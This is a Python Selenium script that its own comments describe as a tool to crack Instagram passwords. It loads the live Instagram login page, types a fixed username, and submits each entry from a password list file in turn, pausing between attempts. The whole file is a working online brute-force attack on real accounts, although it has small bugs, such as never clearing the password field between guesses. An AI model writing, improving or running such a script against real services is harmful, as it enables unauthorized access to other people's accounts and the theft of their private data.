import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By

#Python script that tries to crack instagram passwords using selenium to web scrape and press all the right buttons.
#it reads all the passwords from a file and attempts to guess the right one.




chromeWebDriver = webdriver.Chrome("chromedriver.exe")

#open the instagram website
chromeWebDriver.get("https://www.instagram.com/")

#find the username and password fields
userName = WebDriverWait(chromeWebDriver, 10).until(EC.element_to_be_clickable((By.CSS_SELECTOR, "input[name = 'username']")))
password = WebDriverWait(chromeWebDriver, 10).until(EC.element_to_be_clickable((By.CSS_SELECTOR, "input[name = 'password']")))

#makes sure that both fields are eympty
userName.clear()
password.clear()

#open the passwords list file
with open('passwordlist.txt', 'r') as readFile:
    fileContent = readFile.readlines()

#enter your username here
userName.send_keys("test")

#start to try passwords from the file
for passwords in fileContent:
    #enter the passwords into instagram
    password.send_keys(passwords)
    #press the login button
    login = WebDriverWait(chromeWebDriver, 10).until(EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type ='submit']"))).click()
    #sleep 15 seconds
    time.sleep(15)

try:
    #press not now
    notNow = WebDriverWait(chromeWebDriver, 10).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(),'Not Now')]"))).click()

    #press second not now
    notNow2 = WebDriverWait(chromeWebDriver, 10).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(),'Not Now')]"))).click()
except Exception as e:
    print(e)



